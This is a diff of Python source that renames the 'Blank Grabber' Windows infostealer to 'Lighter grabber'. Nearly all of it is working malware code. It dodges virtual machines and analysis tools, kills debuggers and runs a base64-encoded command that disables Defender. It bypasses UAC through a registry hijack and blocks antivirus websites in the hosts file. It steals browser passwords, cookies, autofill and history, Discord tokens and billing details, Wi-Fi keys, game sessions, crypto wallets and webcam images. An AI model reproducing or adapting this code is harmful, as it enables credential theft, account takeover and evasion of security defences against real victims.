@@ -13,14 +13,14 @@ import time
 import ctypes
 import logging
 import zlib
-
+ 
 from threading import Thread
 from ctypes import wintypes
 from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3
 disable_warnings_urllib3()
-
+ 
 class Settings:
-
+ 
     C2 = "%c2%"
     Mutex = "%mutex%"
     PingMe = bool("%pingme%")
@@ -32,7 +32,7 @@ class Settings:
     HideConsole = bool("%hideconsole%")
     Debug = bool("%debug%")
     RunBoundOnStartup = bool("%boundfilerunonstartup%")
-
+ 
     CaptureWebcam = bool("%capturewebcam%")
     CapturePasswords = bool("%capturepasswords%")
     CaptureCookies = bool("%capturecookies%")
@@ -46,50 +46,50 @@ class Settings:
     CaptureTelegram = bool("%capturetelegram%")
     CaptureCommonFiles = bool("%capturecommonfiles%")
     CaptureWallets = bool("%capturewallets%")
-
+ 
     FakeError = (bool("%fakeerror%"), ("%title%", "%message%", "%icon%"))
     BlockAvSites = bool("%blockavsites%")
     DiscordInjection = bool("%discordinjection%")
-
+ 
 if not hasattr(sys, "_MEIPASS"):
     sys._MEIPASS = os.path.dirname(os.path.abspath(__file__)) # Defines _MEIPASS if does not exist (py mode)
-
+ 
 ctypes.windll.kernel32.SetConsoleMode(ctypes.windll.kernel32.GetStdHandle(-11), 7) # Enables VT100 escape sequences
 logging.basicConfig(format='\033[1;36m%(funcName)s\033[0m:\033[1;33m%(levelname)7s\033[0m:%(message)s')
 for _, logger in logging.root.manager.loggerDict.items():
     logger.disabled= True
-Logger = logging.getLogger("Blank Grabber")
+Logger = logging.getLogger("Lighter grabber")
 Logger.setLevel(logging.INFO)
-
+ 
 if not Settings.Debug:
     Logger.disabled = True
-
-
+ 
+ 
 class VmProtect:
-
+ 
     BLACKLISTED_UUIDS = ('7AB5C494-39F5-4941-9163-47F54D6D5016', '032E02B4-0499-05C3-0806-3C0700080009', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FE822042-A70C-D08B-F1D1-C207055A488F', '76122042-C286-FA81-F0A8-514CC507B250', '481E2042-A1AF-D390-CE06-A8F783B1E76A', 'F3988356-32F5-4AE1-8D47-FD3B8BAFBD4C', '9961A120-E691-4FFE-B67B-F0E4115D5919')
     BLACKLISTED_COMPUTERNAMES = ('bee7370c-8c0c-4', 'desktop-nakffmt', 'win-5e07cos9alr', 'b30f0242-1c6a-4', 'desktop-vrsqlag', 'q9iatrkprh', 'xc64zb', 'desktop-d019gdm', 'desktop-wi8clet', 'server1', 'lisa-pc', 'john-pc', 'desktop-b0t93d6', 'desktop-1pykp29', 'desktop-1y2433r', 'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc', 'desktop-wg3myjs', 'desktop-7xc6gez', 'desktop-5ov9s0o', 'qarzhrdbpj', 'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh', 'compname_5076', 'desktop-vkeons4', 'NTT-EFF-2W11WSS')
     BLACKLISTED_USERS = ('wdagutilityaccount', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm')
     BLACKLISTED_TASKS = ('fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver', 'vmwareservice', 'vmwaretray', 'discordtokenprotector')
-
+ 
     @staticmethod
     def checkUUID() -> bool: # Checks if the UUID of the user is blacklisted or not
         Logger.info("Checking UUID")
         uuid = subprocess.run("wmic csproduct get uuid", shell= True, capture_output= True).stdout.splitlines()[2].decode(errors= 'ignore').strip()
         return uuid in VmProtect.BLACKLISTED_UUIDS
-
+ 
     @staticmethod
     def checkComputerName() -> bool: # Checks if the computer name of the user is blacklisted or not
         Logger.info("Checking computer name")
         computername = os.getenv("computername")
         return computername.lower() in VmProtect.BLACKLISTED_COMPUTERNAMES
-
+ 
     @staticmethod
     def checkUsers() -> bool: # Checks if the username of the user is blacklisted or not
         Logger.info("Checking username")
         user = os.getlogin()
         return user.lower() in VmProtect.BLACKLISTED_USERS
-
+ 
     @staticmethod
     def checkHosting() -> bool: # Checks if the user's system in running on a server or not
         Logger.info("Checking if system is hosted online")
@@ -99,7 +99,7 @@ class VmProtect:
         except Exception:
             Logger.info("Unable to check if system is hosted online")
             return False
-
+ 
     @staticmethod
     def checkHTTPSimulation() -> bool: # Checks if the user is simulating a fake HTTPS connection or not
         Logger.info("Checking if system is simulating connection")
@@ -110,7 +110,7 @@ class VmProtect:
             return False
         else:
             return True
-
+ 
     @staticmethod
     def checkRegistry() -> bool: # Checks if user's registry contains any data which indicates that it is a VM or not
         Logger.info("Checking registry")
@@ -119,11 +119,11 @@ class VmProtect:
         gpucheck = any(x.lower() in subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= "ignore").splitlines()[2].strip().lower() for x in ("virtualbox", "vmware"))
         dircheck = any([os.path.isdir(path) for path in ('D:\\Tools', 'D:\\OS2', 'D:\\NT3X')])
         return (r1.returncode != 1 and r2.returncode != 1) or gpucheck or dircheck
-
+ 
     @staticmethod
     def killTasks() -> None: # Kills blacklisted processes
         Utility.TaskKill(*VmProtect.BLACKLISTED_TASKS)
-
+ 
     @staticmethod
     def isVM() -> bool: # Checks if the user is running on a VM or not
         Logger.info("Checking if system is a VM")
@@ -134,11 +134,11 @@ class VmProtect:
         else:
             Logger.info("System is not a VM")
         return result
-
+ 
 class Errors:
-
+ 
     errors: list[str] = []
-
+ 
     @staticmethod 
     def Catch(func): # Decorator to catch exceptions and store them in the `errors` list
         def newFunc(*args, **kwargs):
@@ -154,11 +154,11 @@ class Errors:
                         Logger.error(trb)
         
         return newFunc
-
+ 
 class Tasks:
-
+ 
     threads: list[Thread] = list()
-
+ 
     @staticmethod
     def AddTask(task: Thread) -> None: # Add new thread to the list
         Tasks.threads.append(task)
@@ -167,9 +167,9 @@ class Tasks:
     def WaitForAll() -> None: # Wait for all threads to finish
         for thread in Tasks.threads:
             thread.join()
-
+ 
 class Syscalls:
-
+ 
     @staticmethod
     def CaptureWebcam(index: int, filePath: str) -> bool:
         avicap32 = ctypes.windll.avicap32
@@ -177,16 +177,16 @@ class Syscalls:
         WM_CAP_DRIVER_CONNECT = 0x0400 + 10
         WM_CAP_DRIVER_DISCONNECT = 0x0402
         WM_CAP_FILE_SAVEDIB = 0x0400 + 100 + 25
-
+ 
         hcam = avicap32.capCreateCaptureWindowW(
             wintypes.LPWSTR("Blank"),
             WS_CHILD,
             0, 0, 0, 0,
             ctypes.windll.user32.GetDesktopWindow(), 0
         )
-
+ 
         result = False
-
+ 
         if hcam:
             if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_DRIVER_CONNECT, index, 0):
                 if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_FILE_SAVEDIB, 0, wintypes.LPWSTR(filePath)):
@@ -195,20 +195,20 @@ class Syscalls:
             ctypes.windll.user32.DestroyWindow(hcam)
         
         return result
-
+ 
     @staticmethod
     def CreateMutex(mutex: str) -> bool:
-
+ 
         kernel32 = ctypes.windll.kernel32
         mutex = kernel32.CreateMutexA(None, False, mutex)
-
+ 
         return kernel32.GetLastError() != 183
     
     @staticmethod
     def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str= None) -> bytes: # Calls the CryptUnprotectData function from crypt32.dll
-
+ 
         class DATA_BLOB(ctypes.Structure):
-
+ 
             _fields_ = [
                 ("cbData", ctypes.c_ulong),
                 ("pbData", ctypes.POINTER(ctypes.c_ubyte))
@@ -217,25 +217,25 @@ class Syscalls:
         pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
         pDataOut = DATA_BLOB()
         pOptionalEntropy = None
-
+ 
         if optional_entropy is not None:
             optional_entropy = optional_entropy.encode("utf-16")
             pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))
-
+ 
         if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy is not None else None, None, None, 0, ctypes.byref(pDataOut)):
             data = (ctypes.c_ubyte * pDataOut.cbData)()
             ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
             ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
             return bytes(data)
-
+ 
         raise ValueError("Invalid encrypted_data provided!")
     
     @staticmethod
     def HideConsole() -> None: # Hides the console window
         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-
+ 
 class Utility:
-
+ 
     @staticmethod
     def GetSelf() -> tuple[str, bool]: # Returns the location of the file and whether exe mode is enabled or not
         if hasattr(sys, "frozen"):
@@ -260,7 +260,7 @@ class Utility:
     @staticmethod
     def UACPrompt(path: str) -> bool: # Shows UAC Prompt
         return ctypes.windll.shell32.ShellExecuteW(None, "runas", path, " ".join(sys.argv), None, 1) == 42
-
+ 
     @staticmethod
     def DisableDefender() -> None: # Tries to disable the defender
         command = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDIgJiAiJVByb2dyYW1GaWxlcyVcV2luZG93cyBEZWZlbmRlclxNcENtZFJ1bi5leGUiIC1SZW1vdmVEZWZpbml0aW9ucyAtQWxs').decode(errors= "ignore") # Encoded because it triggers antivirus and it can delete the file
@@ -283,7 +283,7 @@ class Utility:
     def GetWifiPasswords() -> dict: # Gets wifi passwords stored in the system
         profiles = list()
         passwords = dict()
-
+ 
         for line in subprocess.run('netsh wlan show profile', shell= True, capture_output= True).stdout.decode(errors= 'ignore').strip().splitlines():
             if 'All User Profile' in line:
                 name= line[(line.find(':') + 1):].strip()
@@ -299,7 +299,7 @@ class Utility:
             if not found:
                 passwords[profile] = '(None)'
         return passwords
-
+ 
     @staticmethod
     def GetLnkTarget(path_to_lnk: str) -> str | None: # Finds the target of the given shortcut file
         target = None
@@ -312,7 +312,7 @@ class Utility:
                         if os.path.exists(temp):
                             target = temp
                             break
-
+ 
         return target
     
     @staticmethod
@@ -348,19 +348,19 @@ class Utility:
                     execute("computerdefaults --nouacbypass")
                     log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                     execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
-
+ 
                     if log_count_after > log_count_before:
                         return Utility.UACbypass(method + 1)
-
+ 
                 case 2:
-
+ 
                     execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
                     execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
                     log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                     execute("fodhelper --nouacbypass")
                     log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                     execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
-
+ 
                     if log_count_after > log_count_before:
                         return Utility.UACbypass(method + 1)
                 case _:
@@ -405,7 +405,7 @@ class Utility:
     def HideSelf() -> None: # Hides the current file
         path, _ = Utility.GetSelf()
         subprocess.Popen('attrib +h +s "{}"'.format(path), shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
-
+ 
     @staticmethod
     def BlockSites() -> None: # Tries to block AV related sites using hosts file
         if Utility.IsAdmin():
@@ -419,7 +419,7 @@ class Utility:
                 return
             with open(hostfilepath) as file:
                 data = file.readlines()
-
+ 
             BANNED_SITES = ("virustotal.com", "avast.com", "totalav.com", "scanguard.com", "totaladblock.com", "pcprotect.com", "mcafee.com", "bitdefender.com", "us.norton.com", "avg.com", "malwarebytes.com", "pandasecurity.com", "avira.com", "norton.com", "eset.com", "zillya.com", "kaspersky.com", "usa.kaspersky.com", "sophos.com", "home.sophos.com", "adaware.com", "bullguard.com", "clamav.net", "drweb.com", "emsisoft.com", "f-secure.com", "zonealarm.com", "trendmicro.com", "ccleaner.com")
             newdata = []
             for i in data:
@@ -427,29 +427,29 @@ class Utility:
                     continue
                 else:
                     newdata.append(i)
-
+ 
             for i in BANNED_SITES:
                 newdata.append("\t0.0.0.0 {}".format(i))
                 newdata.append("\t0.0.0.0 www.{}".format(i))
-
+ 
             newdata = "\n".join(newdata).replace("\n\n", "\n")
-
+ 
             subprocess.run("attrib -r {}".format(hostfilepath), shell= True, capture_output= True) # Removes read-only attribute from hosts file
             with open(hostfilepath, "w") as file:
                 file.write(newdata)
             subprocess.run("attrib +r {}".format(hostfilepath), shell= True, capture_output= True) # Adds read-only attribute to hosts file
     
 class Browsers:
-
+ 
     class Chromium:
-
+ 
         BrowserPath: str = None # Stores the path to the browser's storage directory
         EncryptionKey: bytes = None # Stores the encryption key that the browser uses to encrypt the data
-
+ 
         def __init__(self, browserPath: str) -> None:
             if not os.path.isdir(browserPath): # Checks if the browser's storage directory exists
                 raise NotADirectoryError("Browser path not found!")
-
+ 
             self.BrowserPath = browserPath
         
         def GetEncryptionKey(self) -> bytes | None: # Gets the encryption key
@@ -461,23 +461,23 @@ class Browsers:
                 if os.path.isfile(localStatePath):
                     with open(localStatePath, encoding= "utf-8", errors= "ignore") as file:
                         jsonContent: dict = json.load(file)
-
+ 
                     encryptedKey: str = jsonContent["os_crypt"]["encrypted_key"]
                     encryptedKey = base64.b64decode(encryptedKey.encode())[5:]
-
+ 
                     self.EncryptionKey = Syscalls.CryptUnprotectData(encryptedKey)
                     return self.EncryptionKey
-
+ 
                 else:
                     return None
         
         def Decrypt(self, buffer: bytes, key: bytes) -> str: # Decrypts the data using the encryption key
-
+ 
             version = buffer.decode(errors= "ignore")
             if (version.startswith(("v10", "v11"))):
                 iv = buffer[3:15]
                 cipherText = buffer[15:]
-
+ 
                 return pyaes.AESModeOfOperationGCM(key, iv).decrypt(cipherText)[:-16].decode(errors= "ignore")
             else:
                 return str(Syscalls.CryptUnprotectData(buffer))
@@ -485,12 +485,12 @@ class Browsers:
         def GetPasswords(self) -> list[tuple[str, str, str]]: # Gets all passwords from the browser
             encryptionKey = self.GetEncryptionKey()
             passwords = list()
-
+ 
             if encryptionKey is None:
                 return passwords
-
+ 
             loginFilePaths = list()
-
+ 
             for root, _, files in os.walk(self.BrowserPath):
                 for file in files:
                     if file.lower() == "login data":
@@ -512,16 +512,16 @@ class Browsers:
                 cursor = db.cursor()
                 try:
                     results = cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall()
-
+ 
                     for url, username, password in results:
                         password = self.Decrypt(password, encryptionKey)
-
+ 
                         if url and username and password:
                             passwords.append((url, username, password))
-
+ 
                 except Exception:
                     pass
-
+ 
                 cursor.close()
                 db.close()
                 os.remove(tempfile)
@@ -531,12 +531,12 @@ class Browsers:
         def GetCookies(self) -> list[tuple[str, str, str, str, int]]: # Gets all cookies from the browser
             encryptionKey = self.GetEncryptionKey()
             cookies = list()
-
+ 
             if encryptionKey is None:
                 return cookies
             
             cookiesFilePaths = list()
-
+ 
             for root, _, files in os.walk(self.BrowserPath):
                 for file in files:
                     if file.lower() == "cookies":
@@ -558,16 +558,16 @@ class Browsers:
                 cursor = db.cursor()
                 try:
                     results = cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall()
-
+ 
                     for host, name, path, cookie, expiry in results:
                         cookie = self.Decrypt(cookie, encryptionKey)
-
+ 
                         if host and name and cookie:
                             cookies.append((host, name, path, cookie, expiry))
-
+ 
                 except Exception:
                         pass
-
+ 
                 cursor.close()
                 db.close()
                 os.remove(tempfile)
@@ -577,7 +577,7 @@ class Browsers:
         def GetHistory(self) -> list[tuple[str, str, int]]: # Gets all browsing history of the browser
             history = list()
             historyFilePaths = list()
-
+ 
             for root, _, files in os.walk(self.BrowserPath):
                 for file in files:
                     if file.lower() == 'history':
@@ -599,7 +599,7 @@ class Browsers:
                 cursor = db.cursor()
                 try:
                     results = cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls').fetchall()
-
+ 
                     for url, title, vc, lvt in results:
                         if url and title and vc is not None and lvt is not None:
                                 history.append((url, title, vc, lvt))
@@ -612,11 +612,11 @@ class Browsers:
             
             history.sort(key= lambda x: x[3], reverse= True)
             return list([(x[0], x[1], x[2]) for x in history])
-
+ 
         def GetAutofills(self) -> list[str]:
             autofills = list()
             autofillsFilePaths = list()
-
+ 
             for root, _, files in os.walk(self.BrowserPath):
                 for file in files:
                     if file.lower() == 'web data':
@@ -638,7 +638,7 @@ class Browsers:
                 cursor = db.cursor()
                 try:
                     results: list[str] = [x[0] for x in cursor.execute('SELECT value FROM autofill').fetchall()]
-
+ 
                     for data in results:
                         data = data.strip()
                         if data and not data in autofills:
@@ -651,25 +651,25 @@ class Browsers:
                 os.remove(tempfile)
             
             return autofills
-
+ 
 class Discord:
-
+ 
     httpClient = PoolManager(cert_reqs="CERT_NONE") # Client for http requests
     ROAMING = os.getenv("appdata") # Roaming directory
     LOCALAPPDATA = os.getenv("localappdata") # Local application data directory
     REGEX = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}" # Regular expression for matching tokens
     REGEX_ENC = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*" # Regular expression for matching encrypted tokens in Discord clients
-
+ 
     @staticmethod
     def GetHeaders(token: str = None) -> dict: # Returns headers for making requests
         headers = {
         "content-type" : "application/json",
         "user-agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4593.122 Safari/537.36"
         }
-
+ 
         if token:
             headers["authorization"] = token
-
+ 
         return headers
     
     @staticmethod
@@ -677,7 +677,7 @@ class Discord:
         results: list[dict] = list()
         tokens: list[str] = list()
         threads: list[Thread] = list()
-
+ 
         paths = {
             "Discord": os.path.join(Discord.ROAMING, "discord"),
             "Discord Canary": os.path.join(Discord.ROAMING, "discordcanary"),
@@ -703,7 +703,7 @@ class Discord:
             "Brave": os.path.join(Discord.LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"),
             "Iridium": os.path.join(Discord.LOCALAPPDATA, "Iridium", "User Data"),
         }
-
+ 
         for name, path in paths.items():
             if os.path.isdir(path):
                 if name == "FireFox":
@@ -714,7 +714,7 @@ class Discord:
                     t = Thread(target= lambda: tokens.extend(Discord.SafeStorageSteal(path) or list()))
                     t.start()
                     threads.append(t)
-
+ 
                     t = Thread(target= lambda: tokens.extend(Discord.SimpleSteal(path) or list()))
                     t.start()
                     threads.append(t)
@@ -742,9 +742,9 @@ class Discord:
                     2 : 'Nitro',
                     3 : 'Nitro Basic'
                 }
-
+ 
                 nitro_data = nitro_infos.get(nitro_type, '(Unknown)')
-
+ 
                 billing = json.loads(Discord.httpClient.request('GET', 'https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=Discord.GetHeaders(token)).data.decode(errors= "ignore"))
                 if len(billing) == 0:
                     billing = '(No Payment Method)'
@@ -758,7 +758,7 @@ class Discord:
                         if not isinstance(m, dict):
                             continue
                         method_type = m.get('type', 0)
-
+ 
                         match method_type:
                             case 1:
                                 methods['Card'] += 1
@@ -766,7 +766,7 @@ class Discord:
                                 methods['Paypal'] += 1
                             case _:
                                 methods['Unknown'] += 1
-
+ 
                     billing = ', '.join(['{} ({})'.format(name, quantity) for name, quantity in methods.items() if quantity != 0]) or 'None'
                 gifts = list()
                 r = Discord.httpClient.request('GET', 'https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers= Discord.GetHeaders(token)).data.decode(errors= "ignore")
@@ -796,23 +796,23 @@ class Discord:
                     'TOKEN' : token,
                     'GIFTS' : gifts
                 })
-
+ 
         return results
-
+ 
     @staticmethod
     def SafeStorageSteal(path: str) -> list[str]: # Searches for tokens in the Discord client's storage directory
         encryptedTokens = list()
         tokens = list()
         key: str = None
         levelDbPaths: list[str] = list()
-
+ 
         localStatePath = os.path.join(path, "Local State")
-
+ 
         for root, dirs, _ in os.walk(path):
             for dir in dirs:
                 if dir == "leveldb":
                     levelDbPaths.append(os.path.join(root, dir))
-
+ 
         if os.path.isfile(localStatePath) and levelDbPaths:
             with open(localStatePath, errors= "ignore") as file:
                 jsonContent: dict = json.load(file)
@@ -850,12 +850,12 @@ class Discord:
     def SimpleSteal(path: str) -> list[str]: # Searches for tokens in browser's storage directory
         tokens = list()
         levelDbPaths = list()
-
+ 
         for root, dirs, _ in os.walk(path):
             for dir in dirs:
                 if dir == "leveldb":
                     levelDbPaths.append(os.path.join(root, dir))
-
+ 
         for levelDbPath in levelDbPaths:
             for file in os.listdir(levelDbPath):
                 if file.endswith((".log", ".ldb")):
@@ -876,7 +876,7 @@ class Discord:
     @staticmethod
     def FireFoxSteal(path: str) -> list[str]: # Searches for tokens in Firefox browser's storage directory
         tokens = list()
-
+ 
         for root, _, files in os.walk(path):
                 for file in files:
                     if file.lower().endswith(".sqlite"):
@@ -891,7 +891,7 @@ class Discord:
                                         match = match.rstrip("\\")
                                         if not match in tokens:
                                             tokens.append(match)
-
+ 
         return tokens
     
     @staticmethod
@@ -917,13 +917,13 @@ class Discord:
             if check:
                 check = False
                 yield path
-
-class BlankGrabber:
-
+ 
+class Lightergrabber:
+ 
     Separator: str = None # Separator for separating different entries in plaintext files
     TempFolder: str = None # Temporary folder for storing data while collecting
     ArchivePath: str = None # Path of the archive to be made after all the data is collected
-
+ 
     Cookies: list = [] # List of cookies collected
     PasswordsCount: int = 0 # Number of passwords collected
     HistoryCount: int = 0 # Number of history collected
@@ -942,15 +942,15 @@ class BlankGrabber:
     EpicStolen: bool = False # Indicates whether Epic Games account was stolen or not
     UplayStolen: bool = False # Indicates whether Uplay account was stolen or not
     GrowtopiaStolen: bool = False # Indicates whether Growtopia account was stolen or not
-
+ 
     def __init__(self) -> None: # Constructor to call all the functions
-        self.Separator = "\n\n" + "Blank Grabber".center(50, "=") + "\n\n" # Sets the value of the separator
+        self.Separator = "\n\n" + "Lighter grabber".center(50, "=") + "\n\n" # Sets the value of the separator
         
         while True:
             self.ArchivePath = os.path.join(os.getenv("temp"), Utility.GetRandomString() + ".zip") # Sets the archive path
             if not os.path.isfile(self.ArchivePath):
                 break
-
+ 
         Logger.info("Creating temporary folder")
         while True:
             self.TempFolder = os.path.join(os.getenv("temp"), Utility.GetRandomString(10, True))
@@ -1021,7 +1021,7 @@ class BlankGrabber:
                                     self.CommonFilesCount += 1
                                 except Exception:
                                     pass
-
+ 
     @Errors.Catch
     def StealMinecraft(self) -> None: # Steals Minecraft session files
         if Settings.CaptureGames:
@@ -1045,7 +1045,7 @@ class BlankGrabber:
                  "PolyMC" : os.path.join(roaming, "PolyMC", "accounts.json"),
                  "Badlion" : os.path.join(roaming, "Badlion Client", "accounts.json"),
             }
-
+ 
             for name, path in minecraftPaths.items():
                 if os.path.isfile(path):
                     try:
@@ -1059,11 +1059,11 @@ class BlankGrabber:
     def StealGrowtopia(self) -> None: # Steals Growtopia session files
         if Settings.CaptureGames:
             Logger.info("Stealing Growtopia session")
-
+ 
             growtopiadirs = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu("Growtopia")] if x is not None])]
             saveToPath = os.path.join(self.TempFolder, "Games", "Growtopia")
             multiple = len(growtopiadirs) > 1
-
+ 
             for index, path in enumerate(growtopiadirs):
                 targetFilePath = os.path.join(path, "save.dat")
                 if os.path.isfile(targetFilePath):
@@ -1110,7 +1110,7 @@ class BlankGrabber:
             saveToPath = os.path.join(self.TempFolder, "Games", "Steam")
             steamPaths  = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu("Steam")] if x is not None])]
             multiple = len(steamPaths) > 1
-
+ 
             if not steamPaths:
                 steamPaths.append("C:\\Program Files (x86)\\Steam")
             
@@ -1158,7 +1158,7 @@ class BlankGrabber:
             saveToDir = os.path.join(self.TempFolder, "Games", "Roblox")
             note = "# The cookies found in this text file have not been verified online. \n# Therefore, there is a possibility that some of them may work, while others may not."
             cookies = []
-
+ 
             browserCookies = "\n".join(self.Cookies)
             for match in re.findall(r"_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Z0-9]+", browserCookies):
                 cookies.append(match)
@@ -1173,7 +1173,7 @@ class BlankGrabber:
                 cookies.append(match)
         
             cookies = [*set(cookies)] # Removes duplicates
-
+ 
             if cookies:
                 os.makedirs(saveToDir, exist_ok= True)
                 with open(os.path.join(saveToDir, "Roblox Cookies.txt"), "w") as file:
@@ -1185,7 +1185,7 @@ class BlankGrabber:
         if Settings.CaptureWallets:
             Logger.info("Stealing crypto wallets")
             saveToDir = os.path.join(self.TempFolder, "Wallets")
-
+ 
             wallets = (
                 ("Zcash", os.path.join(os.getenv("appdata"), "Zcash")),
                 ("Armory", os.path.join(os.getenv("appdata"), "Armory")),
@@ -1198,7 +1198,7 @@ class BlankGrabber:
                 ("Guarda", os.path.join(os.getenv("appdata"), "Guarda", "Local Storage", "leveldb")),
                 ("Coinomi", os.path.join(os.getenv("localappdata"), "Coinomi", "Coinomi", "wallets")),
             )
-
+ 
             browserPaths = {
                 "Brave" : os.path.join(os.getenv("localappdata"), "BraveSoftware", "Brave-Browser", "User Data"),
                 "Chrome" : os.path.join(os.getenv("localappdata"), "Google", "Chrome", "User Data"),
@@ -1214,7 +1214,7 @@ class BlankGrabber:
                 "Vivaldi" : os.path.join(os.getenv("localappdata"), "Vivaldi", "User Data"),
                 "Yandex" : os.path.join(os.getenv("localappdata"), "Yandex", "YandexBrowser", "User Data")
             }
-
+ 
             for name, path in wallets:
                 if os.path.isdir(path):
                     _saveToDir = os.path.join(saveToDir, name)
@@ -1258,7 +1258,7 @@ class BlankGrabber:
         if Settings.CaptureSystemInfo:
             Logger.info("Stealing system information")
             saveToDir = os.path.join(self.TempFolder, "System")
-
+ 
             process = subprocess.run("systeminfo", capture_output= True, shell= True)
             output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
             if output:
@@ -1279,7 +1279,7 @@ class BlankGrabber:
     def GetDirectoryTree(self) -> None: # Makes directory trees of the common directories
         if Settings.CaptureSystemInfo:
             Logger.info("Getting directory trees")
-
+ 
             PIPE      = chr(9474) + "   "
             TEE       = "".join(chr(x) for x in (9500, 9472, 9472)) + " "
             ELBOW     = "".join(chr(x) for x in (9492, 9472, 9472)) + " "
@@ -1301,7 +1301,7 @@ class BlankGrabber:
                         process = subprocess.run("tree /A /F", shell= True, capture_output= True, cwd= dir)
                         if process.returncode == 0:
                             output[name] = (name + "\n" + "\n".join(process.stdout.decode(errors= "ignore").splitlines()[3:])).replace("|   ", PIPE).replace("+---", TEE).replace("\---", ELBOW)
-
+ 
             for key, value in output.items():
                 os.makedirs(os.path.join(self.TempFolder, "Directories"), exist_ok= True)
                 with open(os.path.join(self.TempFolder, "Directories", "{}.txt".format(key)), "w", encoding= "utf-8") as file:
